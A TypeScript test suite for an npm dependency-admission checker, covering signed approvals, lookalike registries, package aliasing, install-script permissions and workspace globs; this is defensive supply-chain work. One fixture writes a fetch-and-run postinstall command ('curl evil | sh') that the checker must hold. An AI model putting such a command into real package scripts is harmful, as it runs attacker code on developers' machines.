import test from "node:test";
import assert from "node:assert/strict";
import { createHash, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
import { evaluateDependencyAdmission, type AdmissionInput, type DependencyAdmission } from "../src/dependency-admission.js";
import { APPROVAL_SIGNATURE_NAMESPACE, approvalSignedMessage, sshSignatureSignedData } from "../src/dependency-approval.js";
import { parseNpmLockfile, type NpmGraph, type NpmGraphResult } from "../src/dependency-graph.js";
import { dependencyPolicyRevision, parseDependencyPolicy, type DependencyPolicy } from "../src/dependency-policy.js";
import { lockfileUpdateProblem } from "../src/dependency-update.js";

// --- fixtures -------------------------------------------------------------------------------------------------

const REG = "https://registry.npmjs.org/";
const NOW = "2026-11-16T12:00:00Z";
type Packages = Record<string, unknown>;

const reg = (name: string, version: string, extra: Record<string, unknown> = {}, registry = REG) => ({
  version,
  resolved: `${registry}${name}/-/${name.slice(name.indexOf("/") + 1)}-${version}.tgz`,
  integrity: `sha512-${name}-${version}`,
  ...extra,
});
const lockText = (packages: Packages) => JSON.stringify({ name: "app", version: "1.0.0", lockfileVersion: 3, requires: true, packages });
const MANIFEST = JSON.stringify({ name: "app", version: "1.0.0", scripts: { test: "node --test" } });

function graphOf(packages: Packages, manifest: string | null = MANIFEST): NpmGraph {
  const r = parseNpmLockfile(lockText(packages), manifest === null ? {} : { manifest });
  assert.equal(r.status, "ok", r.status === "hold" ? `${r.code}: ${r.detail}` : "");
  return (r as { graph: NpmGraph }).graph;
}
const ok = (g: NpmGraph): NpmGraphResult => ({ status: "ok", graph: g });

const BASE: Packages = {
  "": { name: "app", version: "1.0.0", dependencies: { a: "^1.0.0" } },
  "node_modules/a": reg("a", "1.0.0", { dependencies: { t: "^2.0.0" } }),
  "node_modules/t": reg("t", "2.0.0"),
};
const withRoot = (deps: Record<string, string>, extra: Packages = {}, rootExtra: Record<string, unknown> = {}): Packages => ({
  ...BASE,
  "": { name: "app", version: "1.0.0", dependencies: { a: "^1.0.0", ...deps }, ...rootExtra },
  ...extra,
});

function policyOf(extra: Record<string, unknown> = {}): DependencyPolicy {
  return parseDependencyPolicy({
    schema: "opengantry.dependency-policy.v1",
    mode: "enforce",
    ecosystems: { npm: { lockfile_versions: [2, 3], npm_version: "11.6.2" } },
    registries: [REG],
    approved_baseline_digest: graphOf(BASE).digest,
    lifecycle: { default: "allow-approved" },
    ...extra,
  });
}

function sshString(b: Buffer | string): Buffer {
  const body = typeof b === "string" ? Buffer.from(b) : b;
  const len = Buffer.alloc(4);
  len.writeUInt32BE(body.length);
  return Buffer.concat([len, body]);
}

interface Key {
  priv: KeyObject;
  blob: Buffer;
}

function newKey(): Key {
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  const raw = Buffer.from(publicKey.export({ format: "jwk" }).x!, "base64url");
  return { priv: privateKey, blob: Buffer.concat([sshString("ssh-ed25519"), sshString(raw)]) };
}

function sshsig(key: Key, message: string): string {
  const sig = sign(null, sshSignatureSignedData(message, APPROVAL_SIGNATURE_NAMESPACE, "sha512"), key.priv);
  const blob = Buffer.concat([
    Buffer.from("SSHSIG"),
    Buffer.from([0, 0, 0, 1]),
    sshString(key.blob),
    sshString(APPROVAL_SIGNATURE_NAMESPACE),
    sshString(""),
    sshString("sha512"),
    sshString(Buffer.concat([sshString("ssh-ed25519"), sshString(sig)])),
  ]);
  return `-----BEGIN SSH SIGNATURE-----\n${blob.toString("base64")}\n-----END SSH SIGNATURE-----\n`;
}

const PLANNER = newKey();
const ATTACKER = newKey();
const SIGNERS = `planner@example.com ssh-ed25519 ${PLANNER.blob.toString("base64")}\n`;

const ident = (g: NpmGraph, location: string) => {
  const n = g.nodes.find((x) => x.location === location)!;
  return { name: n.name, version: n.version, source: { kind: n.source.kind, ref: n.source.ref }, integrity: n.integrity };
};

interface ApprovalOpts {
  head: NpmGraph;
  policy?: DependencyPolicy;
  identities?: unknown[];
  lifecycle?: unknown[];
  rootScripts?: unknown[];
  files?: unknown[];
  key?: Key;
  extra?: Record<string, unknown>;
}

function approvalBody(o: ApprovalOpts): Record<string, unknown> {
  return {
    schema: "opengantry.dependency-approval.v1",
    lockfile: "package-lock.json",
    graph_digest: o.head.digest,
    policy_revision: dependencyPolicyRevision(o.policy ?? policyOf()),
    identities: o.identities ?? [],
    lifecycle: o.lifecycle ?? [],
    root_scripts: o.rootScripts ?? [],
    files: o.files ?? [],
    approver: "planner@example.com",
    issued_at: "2026-11-16T00:00:00Z",
    expires_at: "2026-12-16T00:00:00Z",
    ...o.extra,
  };
}

function approval(o: ApprovalOpts, path = ".gitagent/dependency-approvals/a.json"): { path: string; text: string } {
  const b = approvalBody(o);
  return { path, text: JSON.stringify({ ...b, signature: sshsig(o.key ?? PLANNER, approvalSignedMessage(b)) }) };
}

const approvalId = (o: ApprovalOpts) => createHash("sha256").update(approvalSignedMessage(approvalBody(o))).digest("hex");

function admit(head: NpmGraph, input: Partial<AdmissionInput> = {}): DependencyAdmission {
  const base = graphOf(BASE);
  return evaluateDependencyAdmission({
    policy: policyOf(),
    lockfile: "package-lock.json",
    base: ok(base),
    head: ok(head),
    baseline: ok(base),
    approvals: [],
    allowedSigners: SIGNERS,
    contentDigests: {},
    now: NOW,
    headLockfileBytes: 1000,
    ...input,
  });
}

function codes(r: DependencyAdmission): string[] {
  return [...new Set(r.reasons.filter((x) => x.severity !== "info").map((x) => x.code))].sort();
}

function holds(r: DependencyAdmission, code: string, location?: string): void {
  assert.notEqual(r.verdict, "pass", JSON.stringify(r.reasons));
  const hit = r.reasons.find((x) => x.code === code && (location === undefined || x.location === location));
  assert.ok(hit, `expected ${code}${location ? ` at ${location}` : ""}, got ${JSON.stringify(r.reasons)}`);
}

function passes(r: DependencyAdmission): void {
  assert.equal(r.verdict, "pass", JSON.stringify(r.reasons));
}

// --- tests ----------------------------------------------------------------------------------------------------

test("dependency admission: an unchanged graph admitted by the baseline import passes (MSN-0382)", () => {
  const r = admit(graphOf(BASE));
  passes(r);
  assert.equal(r.schema, "opengantry.dependency-admission.v1");
  assert.equal(r.mode, "enforce");
  assert.equal(r.policyRevision, dependencyPolicyRevision(policyOf()));
  assert.equal(r.headGraph, graphOf(BASE).digest);
  assert.deepEqual(r.reasons.filter((x) => x.severity !== "info"), []);
});

test("dependency admission: no baseline means the existing graph is not inferred as admitted (MSN-0382)", () => {
  const r = admit(graphOf(BASE), { policy: policyOf({ approved_baseline_digest: undefined }), baseline: null });
  holds(r, "unapproved_identity", "node_modules/a");
  holds(r, "unapproved_identity", "node_modules/t");
});

test("dependency admission: the baseline must be exactly the imported graph (MSN-0382)", () => {
  holds(admit(graphOf(BASE), { baseline: null }), "baseline_unavailable");
  const other = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const r = admit(graphOf(BASE), { baseline: ok(other) });
  holds(r, "baseline_mismatch");
  assert.equal(r.verdict, "fail");
});

test("dependency admission: unapproved direct and transitive additions hold (MSN-0382)", () => {
  const direct = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  holds(admit(direct), "unapproved_identity", "node_modules/x");
  const transitive = graphOf({ ...BASE, "node_modules/a": reg("a", "1.0.0", { dependencies: { t: "^2.0.0", u: "^1.0.0" } }), "node_modules/u": reg("u", "1.0.0") });
  const r = admit(transitive);
  holds(r, "unapproved_identity", "node_modules/u");
  assert.equal(r.verdict, "hold");
});

test("dependency admission: an exact signed approval for this graph and policy admits the addition (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const o = { head, identities: [ident(head, "node_modules/x")] };
  const r = admit(head, { approvals: [approval(o)] });
  passes(r);
  assert.deepEqual(r.approvalsUsed, [approvalId(o)]);
});

test("dependency admission: a name alone never approves; version, source and integrity must match (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const exact = ident(head, "node_modules/x");
  for (const wrong of [{ ...exact, version: "1.0.1" }, { ...exact, integrity: "sha512-other" }, { ...exact, source: { kind: "registry", ref: "https://npm.corp.example/" } }]) {
    holds(admit(head, { approvals: [approval({ head, identities: [wrong] })] }), "unapproved_identity", "node_modules/x");
  }
});

test("dependency admission: an update holds; the baseline import does not admit future versions (MSN-0382)", () => {
  const bumped = graphOf({ ...BASE, "node_modules/t": reg("t", "2.0.1") });
  holds(admit(bumped), "unapproved_identity", "node_modules/t");
  passes(admit(bumped, { approvals: [approval({ head: bumped, identities: [ident(bumped, "node_modules/t")] })] }));
});

test("dependency admission: a new identity behind an alias needs approval of the real identity (MSN-0382)", () => {
  const honest = graphOf(withRoot({ lodash: "^1.0.0" }, { "node_modules/lodash": reg("lodash", "1.0.0") }));
  const aliased = graphOf(withRoot({ lodash: "npm:evil-lodash@1.0.0" }, { "node_modules/lodash": reg("evil-lodash", "1.0.0", { name: "evil-lodash" }) }));
  const forLodash = approval({ head: aliased, identities: [ident(honest, "node_modules/lodash")] });
  holds(admit(aliased, { approvals: [forLodash] }), "unapproved_identity", "node_modules/lodash");
  passes(admit(aliased, { approvals: [approval({ head: aliased, identities: [ident(aliased, "node_modules/lodash")] })] }));
});

test("dependency admission: a lookalike registry host is not the allowed registry, approved or not (MSN-0382)", () => {
  const evil = "https://registry.npmjs.org.evil.example/";
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0", {}, evil) }));
  holds(admit(head, { approvals: [approval({ head, identities: [ident(head, "node_modules/x")] })] }), "registry_not_allowed", "node_modules/x");
  const sub = "https://registry.npmjs.org/evil/";
  const nested = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0", {}, sub) }));
  holds(admit(nested), "registry_not_allowed", "node_modules/x");
});

test("dependency admission: credentials in a source refuse; missing integrity holds (MSN-0382)", () => {
  const cred = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0", { resolved: "https://u:tok@registry.npmjs.org/x/-/x-1.0.0.tgz" }) }));
  const r = admit(cred);
  holds(r, "source_credentials", "node_modules/x");
  assert.equal(r.verdict, "fail");
  assert.ok(!JSON.stringify(r).includes("tok"), "no secret in the result");
  const noIntegrity = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": { version: "1.0.0", resolved: `${REG}x/-/x-1.0.0.tgz` } }));
  holds(admit(noIntegrity), "integrity_missing", "node_modules/x");
});

test("dependency admission: git, URL, tarball, bundled, shrinkwrap and unresolved sources hold by default (MSN-0382)", () => {
  const head = graphOf(
    withRoot(
      { g: "github:o/g", u: "https://files.example/u.tgz", f: "file:vendor/f.tgz", s: "^1.0.0", n: "^1.0.0" },
      {
        "node_modules/g": { version: "1.0.0", resolved: "git+ssh://git@github.com/o/g.git#0123456789abcdef0123456789abcdef01234567" },
        "node_modules/u": { version: "1.0.0", resolved: "https://files.example/u.tgz", integrity: "sha512-u" },
        "node_modules/f": { version: "1.0.0", resolved: "file:vendor/f.tgz", integrity: "sha512-f" },
        "node_modules/s": reg("s", "1.0.0", { hasShrinkwrap: true }),
        "node_modules/s/node_modules/b": { version: "1.0.0", inBundle: true },
        "node_modules/n": { version: "1.0.0" },
      },
    ),
  );
  const r = admit(head);
  holds(r, "source_git", "node_modules/g");
  holds(r, "source_url", "node_modules/u");
  holds(r, "source_file", "node_modules/f");
  holds(r, "source_shrinkwrap", "node_modules/s");
  holds(r, "source_bundled", "node_modules/s/node_modules/b");
  holds(r, "source_unresolved", "node_modules/n");
});

test("dependency admission: a file: folder outside workspaces is admitted only by path plus content digest at base (MSN-0382)", () => {
  const packages = withRoot({ v: "file:vendor/v" }, { "node_modules/v": { resolved: "vendor/v", link: true }, "vendor/v": { name: "v", version: "1.0.0" } });
  const head = graphOf(packages);
  holds(admit(head), "source_file", "vendor/v");
  const digest = "c".repeat(64);
  const files = [{ path: "vendor/v", content_digest: digest }];
  passes(admit(head, { approvals: [approval({ head, files })], contentDigests: { "vendor/v": digest } }));
  holds(admit(head, { approvals: [approval({ head, files })], contentDigests: { "vendor/v": "d".repeat(64) } }), "source_file", "vendor/v");
  holds(admit(head, { approvals: [approval({ head, files })] }), "source_file", "vendor/v");
});

test("dependency admission: a file: tarball and a nested lockfile resolve to repository paths; escaping the repository holds (MSN-0382)", () => {
  const tarball = graphOf(withRoot({ f: "file:vendor/f.tgz" }, { "node_modules/f": { version: "1.0.0", resolved: "file:vendor/f.tgz", integrity: "sha512-f" } }));
  const digest = "e".repeat(64);
  const nested = { lockfile: "examples/app/package-lock.json" };
  const o = { head: tarball, files: [{ path: "examples/app/vendor/f.tgz", content_digest: digest }], extra: nested };
  passes(admit(tarball, { lockfile: nested.lockfile, approvals: [approval(o)], contentDigests: { "examples/app/vendor/f.tgz": digest } }));
  const outside = graphOf(withRoot({ o: "file:../../../o" }, { "node_modules/o": { resolved: "../../../o", link: true }, "../../../o": { name: "o", version: "1.0.0" } }));
  holds(admit(outside, { lockfile: nested.lockfile }), "local_outside_repository", "../../../o");
});

test("dependency admission: the local folder's own packages follow its admission (MSN-0382)", () => {
  const packages = withRoot(
    { og: "file:../.." },
    { "node_modules/og": { resolved: "../..", link: true }, "../..": { name: "og", version: "4.0.0" }, "../../node_modules/zod": reg("zod", "4.0.0") },
  );
  const head = graphOf(packages);
  const lockfile = "examples/iii/package-lock.json";
  const r = admit(head, { lockfile });
  holds(r, "source_file", "../..");
  holds(r, "source_external", "../../node_modules/zod");
  const digest = "f".repeat(64);
  const o = { head, files: [{ path: ".", content_digest: digest }], extra: { lockfile } };
  passes(admit(head, { lockfile, approvals: [approval(o)], contentDigests: { ".": digest } }));
});

test("dependency admission: workspaces and links into them need no approval (MSN-0382)", () => {
  const head = graphOf({
    ...BASE,
    "": { name: "app", version: "1.0.0", workspaces: ["packages/*"], dependencies: { a: "^1.0.0" } },
    "node_modules/w": { resolved: "packages/w", link: true },
    "packages/w": { name: "w", version: "1.0.0" },
  });
  const baseline = graphOf({ ...BASE, "": { name: "app", version: "1.0.0", workspaces: ["packages/*"], dependencies: { a: "^1.0.0" } } });
  // The glob must exist at base: the base graph is the authority for workspaces, not the head lockfile.
  passes(admit(head, { base: ok(baseline), baseline: ok(baseline), policy: policyOf({ approved_baseline_digest: baseline.digest }) }));
});

// Review round (PR #366, finding 1): a workspace glob written into the head lockfile is not authority.
const wsRoot = (workspaces: string[]) => ({ name: "app", version: "1.0.0", workspaces, dependencies: { a: "^1.0.0" } });
const folderAt = (location: string, workspaces: string[]): NpmGraph => {
  const name = location.slice(location.lastIndexOf("/") + 1);
  return graphOf({ ...BASE, "": { ...wsRoot(workspaces), dependencies: { a: "^1.0.0", [name]: `file:${location}` } }, [`node_modules/${name}`]: { resolved: location, link: true }, [location]: { name, version: "1.0.0" } });
};

test("dependency admission: a workspace glob that exists only in the head lockfile admits nothing (MSN-0382)", () => {
  const head = folderAt("vendor/evil", ["vendor/*"]);
  assert.equal(head.nodes.find((n) => n.location === "vendor/evil")!.source.kind, "workspace", "slice 1 calls it a workspace by the head glob");
  const r = admit(head);
  holds(r, "source_file", "vendor/evil");
  holds(r, "root_workspaces_changed", "");
});

test("dependency admission: head globs `../*` and `**` do not admit a folder outside the repository (MSN-0382)", () => {
  for (const glob of ["../*", "**"]) {
    const head = folderAt("../outside", [glob]);
    assert.equal(head.nodes.find((n) => n.location === "../outside")!.source.kind, "workspace", glob);
    const r = admit(head);
    holds(r, "local_outside_repository", "../outside");
    holds(r, "root_workspaces_changed", "");
  }
  // Even a base glob does not make a folder outside the repository a workspace.
  const base = graphOf({ ...BASE, "": wsRoot(["../*"]) });
  holds(admit(folderAt("../outside", ["../*"]), { base: ok(base), baseline: ok(base), policy: policyOf({ approved_baseline_digest: base.digest }) }), "local_outside_repository", "../outside");
});

test("dependency admission: an unchanged base workspace still passes; a dropped glob is a root change (MSN-0382)", () => {
  const base = graphOf({ ...BASE, "": wsRoot(["packages/*"]) });
  const at = { base: ok(base), baseline: ok(base), policy: policyOf({ approved_baseline_digest: base.digest }) };
  passes(admit(folderAt("packages/w", ["packages/*"]), at));
  const dropped = folderAt("packages/w", []);
  holds(admit(dropped, at), "root_workspaces_changed", "");
  holds(admit(dropped, at), "source_file", "packages/w");
});

test("dependency admission: a root workspaces change needs an approval naming the globs, and new folders still need path plus digest (MSN-0382)", () => {
  const head = folderAt("packages/w", ["packages/*"]);
  const digest = "9".repeat(64);
  const files = [{ path: "packages/w", content_digest: digest }];
  const onlyGlobs = admit(head, { approvals: [approval({ head, extra: { root_workspaces: ["packages/*"] } })], contentDigests: { "packages/w": digest } });
  holds(onlyGlobs, "source_file", "packages/w");
  assert.ok(!onlyGlobs.reasons.some((x) => x.code === "root_workspaces_changed"), JSON.stringify(onlyGlobs.reasons));
  holds(admit(head, { approvals: [approval({ head, files })], contentDigests: { "packages/w": digest } }), "root_workspaces_changed", "");
  holds(admit(head, { approvals: [approval({ head, files, extra: { root_workspaces: ["vendor/*"] } })], contentDigests: { "packages/w": digest } }), "root_workspaces_changed", "");
  passes(admit(head, { approvals: [approval({ head, files, extra: { root_workspaces: ["packages/*"] } })], contentDigests: { "packages/w": digest } }));
  const stale = graphOf({ ...BASE, "": wsRoot(["packages/*"]) });
  holds(admit(head, { approvals: [approval({ head: stale, files, extra: { root_workspaces: ["packages/*"] } })], contentDigests: { "packages/w": digest } }), "root_workspaces_changed", "");
  holds(admit(head, { approvals: [approval({ head, extra: { root_workspaces: ["packages/*", "packages/*"] } })] }), "approval_invalid");
});

test("dependency admission: dev and optional platform packages are judged like production ones (MSN-0382)", () => {
  const head = graphOf(
    withRoot(
      {},
      {
        "node_modules/d": reg("d", "1.0.0", { dev: true }),
        "node_modules/@esb/linux-x64": reg("@esb/linux-x64", "1.0.0", { optional: true, os: ["linux"], cpu: ["x64"] }),
        "node_modules/@esb/darwin-arm64": reg("@esb/darwin-arm64", "1.0.0", { optional: true, os: ["darwin"], cpu: ["arm64"] }),
      },
      { devDependencies: { d: "^1.0.0" }, optionalDependencies: { "@esb/linux-x64": "1.0.0", "@esb/darwin-arm64": "1.0.0" } },
    ),
  );
  const r = admit(head);
  holds(r, "unapproved_identity", "node_modules/d");
  holds(r, "unapproved_identity", "node_modules/@esb/linux-x64");
  holds(r, "unapproved_identity", "node_modules/@esb/darwin-arm64");
  const linuxOnly = approval({ head, identities: [ident(head, "node_modules/d"), ident(head, "node_modules/@esb/linux-x64")] });
  const partial = admit(head, { approvals: [linuxOnly] });
  assert.deepEqual(partial.reasons.filter((x) => x.severity !== "info").map((x) => x.location), ["node_modules/@esb/darwin-arm64"], "every listed platform needs approval");
});

test("dependency admission: install scripts are denied by default and need an exact permission otherwise (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0", { hasInstallScript: true }) }));
  const id = ident(head, "node_modules/x");
  const all = { ...id, scripts: ["install", "postinstall", "preinstall"] };
  const deny = policyOf({ lifecycle: { default: "deny" } });
  holds(admit(head, { policy: deny, approvals: [approval({ head, policy: deny, identities: [id], lifecycle: [all] })] }), "lifecycle_denied", "node_modules/x");
  holds(admit(head, { approvals: [approval({ head, identities: [id] })] }), "lifecycle_unapproved", "node_modules/x");
  holds(admit(head, { approvals: [approval({ head, identities: [id], lifecycle: [{ ...id, scripts: ["postinstall"] }] })] }), "lifecycle_unapproved", "node_modules/x");
  passes(admit(head, { approvals: [approval({ head, identities: [id], lifecycle: [all] })] }));
});

test("dependency admission: a carried package that gains an install script needs a new permission (MSN-0382)", () => {
  const head = graphOf({ ...BASE, "node_modules/t": reg("t", "2.0.0", { hasInstallScript: true }) });
  const r = admit(head);
  holds(r, "lifecycle_unapproved", "node_modules/t");
});

test("dependency admission: root lifecycle scripts are judged by name and command (MSN-0382)", () => {
  const sha = (s: string) => createHash("sha256").update(s).digest("hex");
  const manifest = (scripts: Record<string, string>) => JSON.stringify({ name: "app", version: "1.0.0", scripts });
  const head = graphOf(BASE, manifest({ postinstall: "node setup.js" }));
  holds(admit(head), "lifecycle_unapproved", "");
  const permit = [{ script: "postinstall", command_sha256: sha("node setup.js") }];
  passes(admit(head, { approvals: [approval({ head, rootScripts: permit })] }));
  const changed = graphOf(BASE, manifest({ postinstall: "curl evil | sh" }));
  holds(admit(changed, { approvals: [approval({ head: changed, rootScripts: permit })] }), "lifecycle_unapproved", "");
  holds(admit(head, { policy: policyOf({ lifecycle: { default: "deny" } }) }), "lifecycle_denied", "");
  holds(admit(graphOf(BASE, null)), "root_manifest_missing");
});

test("dependency admission: stale approvals do not admit (graph digest or policy revision changed) (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const other = graphOf(withRoot({ x: "^1.0.0", y: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0"), "node_modules/y": reg("y", "1.0.0") }));
  const ids = [ident(head, "node_modules/x")];
  holds(admit(head, { approvals: [approval({ head: other, identities: ids })] }), "approval_stale", "node_modules/x");
  const oldPolicy = policyOf({ registries: [REG, "https://npm.corp.example/"] });
  holds(admit(head, { approvals: [approval({ head, policy: oldPolicy, identities: ids })] }), "approval_stale", "node_modules/x");
});

test("dependency admission: expired and revoked approvals do not admit (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const o = { head, identities: [ident(head, "node_modules/x")] };
  holds(admit(head, { approvals: [approval(o)], now: "2026-12-17T00:00:00Z" }), "approval_expired", "node_modules/x");
  const revocation = {
    path: ".gitagent/dependency-approvals/revoke-1.json",
    text: JSON.stringify({ schema: "opengantry.dependency-revocation.v1", revokes: [approvalId(o)], reason: "compromised maintainer", revoked_by: "planner@example.com", issued_at: "2026-11-16T06:00:00Z" }),
  };
  const r = admit(head, { approvals: [approval(o), revocation] });
  holds(r, "approval_revoked", "node_modules/x");
  assert.deepEqual(r.approvalsUsed, []);
});

test("dependency admission: a forged or tampered approval fails; it never admits (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const o = { head, identities: [ident(head, "node_modules/x")] };
  const forged = admit(head, { approvals: [approval({ ...o, key: ATTACKER })] });
  holds(forged, "approval_signature_invalid");
  assert.equal(forged.verdict, "fail");
  const good = JSON.parse(approval(o).text) as Record<string, unknown>;
  const swapped = { path: ".gitagent/dependency-approvals/a.json", text: JSON.stringify({ ...good, expires_at: "2036-12-16T00:00:00Z" }) };
  assert.equal(admit(head, { approvals: [swapped] }).verdict, "fail");
  assert.equal(admit(head, { approvals: [approval(o)], allowedSigners: null }).verdict, "fail", "no allowlist at base: nothing verifies");
});

test("dependency admission: approvals outside approval_refs or for another lockfile are not authority (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const o = { head, identities: [ident(head, "node_modules/x")] };
  holds(admit(head, { approvals: [approval(o, "approvals/a.json")] }), "approval_outside_refs");
  holds(admit(head, { approvals: [approval(o, ".gitagent/dependency-approvals/../../approvals/a.json")] }), "approval_outside_refs");
  holds(admit(head, { approvals: [approval({ ...o, extra: { lockfile: "other/package-lock.json" } })] }), "unapproved_identity", "node_modules/x");
});

test("dependency admission: malformed approval files and graph holds hold; nothing is partially admitted (MSN-0382)", () => {
  const head = graphOf(BASE);
  holds(admit(head, { approvals: [{ path: ".gitagent/dependency-approvals/x.json", text: "{" }] }), "approval_invalid");
  holds(admit(head, { approvals: [{ path: ".gitagent/dependency-approvals/x.json", text: JSON.stringify({ schema: "other" }) }] }), "approval_invalid");
  const lossy = parseNpmLockfile(lockText({ ...BASE, "node_modules/t": { ...reg("t", "2.0.0"), surprise: 1 } }));
  assert.equal(lossy.status, "hold");
  const r = evaluateDependencyAdmission({ policy: policyOf(), lockfile: "package-lock.json", base: ok(head), head: lossy, baseline: ok(head), approvals: [], allowedSigners: SIGNERS, contentDigests: {}, now: NOW, headLockfileBytes: 1000 });
  holds(r, "graph_hold");
  assert.equal(r.headGraph, null);
  const v2only = policyOf({ ecosystems: { npm: { lockfile_versions: [2], npm_version: "11.6.2" } } });
  holds(admit(head, { policy: v2only }), "unsupported_lockfile");
  holds(admit(head, { policy: policyOf({ limits: { max_nodes: 1 } }) }), "too_many_nodes");
  holds(admit(head, { now: "yesterday" }), "invalid_input");
  holds(admit(head, { now: "2026-02-31T00:00:00Z" }), "invalid_input");
  holds(admit(head, { now: "2026-11-16T24:00:00Z" }), "invalid_input");
  holds(admit(head, { headLockfileBytes: -1 }), "invalid_input");
  holds(admit(head, { approvals: Array.from({ length: 1001 }, (_, i) => ({ path: `.gitagent/dependency-approvals/${String(i)}.json`, text: "{}" })) }), "approvals_too_large");
});

test("dependency admission: a base without a lockfile makes every package new (MSN-0382)", () => {
  const head = graphOf(BASE);
  passes(admit(head, { base: null }));
  holds(admit(head, { base: null, baseline: null, policy: policyOf({ approved_baseline_digest: undefined }) }), "unapproved_identity");
});

test("dependency admission: the dependency_update exemption cannot waive admission (MSN-0382)", () => {
  const before = JSON.parse(lockText(BASE)) as Record<string, unknown>;
  const bumpedPackages = { ...BASE, "node_modules/t": reg("t", "2.0.1") };
  const after = JSON.parse(lockText(bumpedPackages)) as Record<string, unknown>;
  assert.equal(lockfileUpdateProblem(before, after, [REG]), null, "ADR-0057 accepts this bot bump");
  holds(admit(graphOf(bumpedPackages)), "unapproved_identity", "node_modules/t");
});

test("dependency admission: audit mode reports the same verdict, labelled audit (MSN-0382)", () => {
  const head = graphOf(withRoot({ x: "^1.0.0" }, { "node_modules/x": reg("x", "1.0.0") }));
  const audit = policyOf({ mode: "audit" });
  const r = admit(head, { policy: audit });
  assert.equal(r.mode, "audit");
  holds(r, "unapproved_identity", "node_modules/x");
});

test("dependency admission: the result is deterministic and sorted (MSN-0382)", () => {
  const head = graphOf(withRoot({ y: "^1.0.0", x: "^1.0.0" }, { "node_modules/y": reg("y", "1.0.0"), "node_modules/x": reg("x", "1.0.0") }));
  const a = admit(head);
  const b = admit(head);
  assert.deepEqual(a, b);
  assert.deepEqual(codes(a), ["unapproved_identity"]);
  assert.deepEqual(a.reasons.filter((x) => x.severity !== "info").map((x) => x.location), ["node_modules/x", "node_modules/y"]);
});

// Review round (PR #366, finding 3): the policy's depth and size limits are enforced by the evaluator itself.
test("dependency admission: limits.max_depth and limits.max_lockfile_bytes are enforced (MSN-0382)", () => {
  const nested = graphOf({ ...BASE, "node_modules/a/node_modules/t": reg("t", "2.0.0") });
  const shallow = policyOf({ limits: { max_depth: 1 } });
  holds(admit(nested, { policy: shallow }), "too_deep", "node_modules/a/node_modules/t");
  assert.ok(!admit(nested).reasons.some((x) => x.code === "too_deep"), "the default depth admits two levels");
  const small = policyOf({ limits: { max_lockfile_bytes: 1000 } });
  holds(admit(graphOf(BASE), { policy: small, headLockfileBytes: 1001 }), "lockfile_too_large");
  passes(admit(graphOf(BASE), { policy: small, headLockfileBytes: 1000 }));
});
